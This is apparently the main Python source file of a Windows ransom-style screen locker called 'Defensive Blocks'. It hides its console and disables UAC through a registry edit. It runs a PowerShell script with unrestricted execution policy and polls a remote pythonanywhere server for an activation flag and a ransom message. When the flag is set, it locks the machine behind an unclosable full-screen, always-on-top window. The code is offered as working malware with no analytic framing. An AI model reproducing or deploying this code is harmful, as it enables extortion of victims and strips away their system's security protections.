""" this is the main file """
#Hide the Console
import win32console
import win32gui
window = win32console.GetConsoleWindow()
win32gui.ShowWindow(window, 0)
import requests
from finals import Finals as final
from threading import Thread
from assisting import *
from devcon_automations import *
from time import sleep
import tkinter as tk
import schedule
import subprocess



#  pyinstaller --onefile --uac-admin service.py -r prog.exe.manifest,1


"""important global vars"""


getActivation = "http://defensiveblocks.pythonanywhere.com/clients/" + final.USERNAME + "/"
getMsg = "http://defensiveblocks.pythonanywhere.com/clientsm/" + final.USERNAME + "/"
wa = ""


""" This function creates the ransom window """


def ransom_win():
    try:
        msg = requests.get(getMsg).text  # get user message from db
    except:
        msg = get(final.msg_field)
    wa = tk.Tk()
    wa.title('Defensive Blocks')
    wa.overrideredirect(True)
    x = wa.winfo_screenwidth()
    y = wa.winfo_screenheight()
    wa.geometry("%dx%d" % (x, y))  # full screen
    wa.focus_set()  # <-- move focus to this widget
    wa.protocol("WM_DELETE_WINDOW", exb)  # delete delete window
    wa.protocol("WM_MINIMIZE_WINDOW", exb)  # delete minimize window
    lb1 = tk.Label(wa, text=str(msg) + "\n", font=("Arial Bold", 70), pady=200, fg="RED")
    lb1.pack()
    wa.call('wm', 'attributes', '.', '-topmost', '1')  # always on top
    while 1:
        wa.update()
        #lock()
        sleep(1)
        a_field = get(final.active_field)  # check if needs to be closed
        if a_field == "0":
            wa.destroy()
            return


""" send requests each 15 seconds, start/stop locking"""
def main():
    subprocess.Popen("reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f")
    print("run")
    try:
        psxmlgen = subprocess.Popen(['powershell.exe',
                                     '-ExecutionPolicy',
                                     'Unrestricted',
                                     prog_location + "/Enable-WOLWindowsNICSettings.ps1"], cwd=os.getcwd())
        result = psxmlgen.wait()
    except:
        pass
    try:
        activation = (requests.get(getActivation)).text  # current activation
    except:
        activation = get(final.active_field)
    try:
        msg = (requests.get(getMsg)).text
        replace(final.msg_field,msg)
    except:
        pass
    try:
        is_open = wa.winfo_ismapped()  # if the window is open return 1
    except:
        is_open = 0  # if window closed return exception
    print("after replace")
    if get(final.active_field) != str(activation):  # compare previous to current
        if str(activation) == "1" and get(final.active_field) == "0":  # if current is true, current is false
            replace(final.active_field, activation)  # chagne current to true
            lock()
            open_window = Thread(target=ransom_win)  # open ransom window thread
            open_window.start()
        elif str(activation) == "0" and str(get(final.active_field)) == "1":  # if current is false, previous is true
            replace(final.active_field, activation)
            unlock()
    elif activation == "1":  # if need to lock
        if is_open != get(final.active_field) and is_open == 0:  # check if locking has already done (case of pc in restart)
            replace(final.active_field, 1)
            lock()
            open_window = Thread(target=ransom_win)  # open the locking widnow with thread, lock
            open_window.start()
    elif activation == "0":  # if need to close
        if is_open != get(final.active_field) and is_open == 1:
            replace(final.active_field, 0)  # not activated
            unlock()
    else:
        return


"""
schedules program to run each 10 seconds
"""

schedule.every(7).seconds.do(main)
while True:
    schedule.run_pending()
